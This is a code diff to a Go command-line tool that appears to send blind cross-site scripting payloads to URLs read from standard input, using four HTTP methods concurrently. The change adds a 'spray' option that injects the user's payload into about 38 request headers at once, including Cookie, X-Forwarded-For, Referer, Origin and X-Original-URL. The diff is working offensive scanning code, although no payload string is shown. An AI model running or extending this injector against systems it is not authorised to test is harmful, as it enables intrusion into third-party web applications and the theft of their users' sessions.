@@ -29,12 +29,14 @@ func main () {
 	var h string
 	var a bool
 	var t bool
+	var s bool
 	// The flag / arguments
 	flag.IntVar(&c, "concurrency", 30, "Set the concurrency")
 	flag.StringVar(&h, "header", "User-Agent", "Set the custom header")
 	flag.StringVar(&p, "payload", "", "the blind XSS payload")
 	flag.BoolVar(&a, "appendMode", false, "Append the payload to the parameter")
 	flag.BoolVar(&t, "parameters", false, "Test the parameters for blind xss")
+	flag.BoolVar(&s, "spray", false, "Spray and Pray")
 	// Parse the arguments
 	flag.Parse()
 
@@ -63,7 +65,7 @@ func main () {
 		for i:=0; i<c; i++ {
 			wg.Add(1)
 			go func () {
-				testbxss(p, h, a, t)
+				testbxss(p, h, s, a, t)
 				wg.Done()
 			}()
 			wg.Wait()
@@ -71,7 +73,7 @@ func main () {
 	}
 }
 
-func testbxss(payload string, header string, appendMode bool, isParameters bool) {
+func testbxss(payload string, header string, spray bool, appendMode bool, isParameters bool) {
 	time.Sleep(500 * time.Microsecond)
 	scanner := bufio.NewScanner(os.Stdin)
 	client:=&http.Client{ Timeout: 3*time.Second,}
@@ -83,17 +85,17 @@ func testbxss(payload string, header string, appendMode bool, isParameters bool)
 		fmt.Println("")
 
 		// Make GET Request
-		makeRequest(client, "GET", payload, link, header, appendMode, isParameters)
+		makeRequest(client, "GET", payload, link, header, spray, appendMode, isParameters)
 		// Make POST Request
-                makeRequest(client, "POST", payload, link, header, appendMode, isParameters)
+                makeRequest(client, "POST", payload, link, header, spray, appendMode, isParameters)
 		// Make OPTIONS Request
-                makeRequest(client, "OPTIONS", payload, link, header, appendMode, isParameters)
+                makeRequest(client, "OPTIONS", payload, link, header, spray, appendMode, isParameters)
 		// Make PUT Request
-                makeRequest(client, "PUT", payload, link, header, appendMode, isParameters)	
+                makeRequest(client, "PUT", payload, link, header, spray, appendMode, isParameters)	
 	}	
 }
 
-func makeRequest(client *http.Client, method string, payload string, link string, header string, appendMode bool, isParameters bool) {
+func makeRequest(client *http.Client, method string, payload string, link string, header string, spray bool, appendMode bool, isParameters bool) {
 
 	fmt.Printf(NoticeColor, "\n[*] Making request with " ,method)
 	fmt.Println("")
@@ -122,6 +124,46 @@ func makeRequest(client *http.Client, method string, payload string, link string
 			return
         	}
         	request.Header.Set(header, payload)
+        	if spray {
+	        	request.Header.Set("Cookie", payload)
+	            request.Header.Set("CF-Connecting-IP", payload)
+	            request.Header.Set("Client-IP", payload)
+	            request.Header.Set("Cluster-Client-IP", payload)
+	            request.Header.Set("Contact", payload)
+	            request.Header.Set("Destination", payload)
+	            request.Header.Set("Forwarded", payload)
+	            request.Header.Set("From", payload)
+	            request.Header.Set("Origin", payload)
+	            request.Header.Set("Profile", payload)
+	            request.Header.Set("Proxy-Host", payload)
+	            request.Header.Set("Proxy", payload)
+	            request.Header.Set("Referer", payload)
+	            request.Header.Set("True-Client-IP", payload)
+	            request.Header.Set("UID", payload)
+	            request.Header.Set("Via", payload)
+	            request.Header.Set("X-Arbitrary", payload)
+	            request.Header.Set("X-CSRF-Token", payload)
+	            request.Header.Set("XSRF-Token", payload)
+	            request.Header.Set("X-Client-IP", payload)
+	            request.Header.Set("X-Cluster-Client-IP", payload)
+	            request.Header.Set("X-Forwarded-For", payload)
+	            request.Header.Set("X-Forwarded-Host", payload)
+	            request.Header.Set("X-Forwarded-Proto", payload)
+	            request.Header.Set("X-Forwarded-Server", payload)
+	            request.Header.Set("X-HTTP-Destination-URL", payload)
+	            request.Header.Set("X-Host", payload)
+	            request.Header.Set("X-Original-URL", payload)
+	            request.Header.Set("X-Originating-IP", payload)
+	            request.Header.Set("X-Real-IP", payload)
+	            request.Header.Set("X-Remote-Addr", payload)
+	            request.Header.Set("X-Remote-IP", payload)
+	            request.Header.Set("X-Wap-Profile", payload)
+	            request.Header.Set("CF-IP-Country", payload)
+	            request.Header.Set("CF-Visitor", payload)
+	            request.Header.Set("X-ARR-LOG-ID", payload)
+	            request.Header.Set("Debug", payload)
+	            request.Header.Set("X-Debug-Info", payload)
+        	}
         	client.Do(request)
 	}else {
 
@@ -131,6 +173,46 @@ func makeRequest(client *http.Client, method string, payload string, link string
                         return
                 }
                 request.Header.Set(header, payload)
+                if spray {
+		        	request.Header.Set("Cookie", payload)
+		            request.Header.Set("CF-Connecting-IP", payload)
+		            request.Header.Set("Client-IP", payload)
+		            request.Header.Set("Cluster-Client-IP", payload)
+		            request.Header.Set("Contact", payload)
+		            request.Header.Set("Destination", payload)
+		            request.Header.Set("Forwarded", payload)
+		            request.Header.Set("From", payload)
+		            request.Header.Set("Origin", payload)
+		            request.Header.Set("Profile", payload)
+		            request.Header.Set("Proxy-Host", payload)
+		            request.Header.Set("Proxy", payload)
+		            request.Header.Set("Referer", payload)
+		            request.Header.Set("True-Client-IP", payload)
+		            request.Header.Set("UID", payload)
+		            request.Header.Set("Via", payload)
+		            request.Header.Set("X-Arbitrary", payload)
+		            request.Header.Set("X-CSRF-Token", payload)
+		            request.Header.Set("XSRF-Token", payload)
+		            request.Header.Set("X-Client-IP", payload)
+		            request.Header.Set("X-Cluster-Client-IP", payload)
+		            request.Header.Set("X-Forwarded-For", payload)
+		            request.Header.Set("X-Forwarded-Host", payload)
+		            request.Header.Set("X-Forwarded-Proto", payload)
+		            request.Header.Set("X-Forwarded-Server", payload)
+		            request.Header.Set("X-HTTP-Destination-URL", payload)
+		            request.Header.Set("X-Host", payload)
+		            request.Header.Set("X-Original-URL", payload)
+		            request.Header.Set("X-Originating-IP", payload)
+		            request.Header.Set("X-Real-IP", payload)
+		            request.Header.Set("X-Remote-Addr", payload)
+		            request.Header.Set("X-Remote-IP", payload)
+		            request.Header.Set("X-Wap-Profile", payload)
+		            request.Header.Set("CF-IP-Country", payload)
+		            request.Header.Set("CF-Visitor", payload)
+		            request.Header.Set("X-ARR-LOG-ID", payload)
+		            request.Header.Set("Debug", payload)
+		            request.Header.Set("X-Debug-Info", payload)
+	        	}
                 client.Do(request)
 
 	}
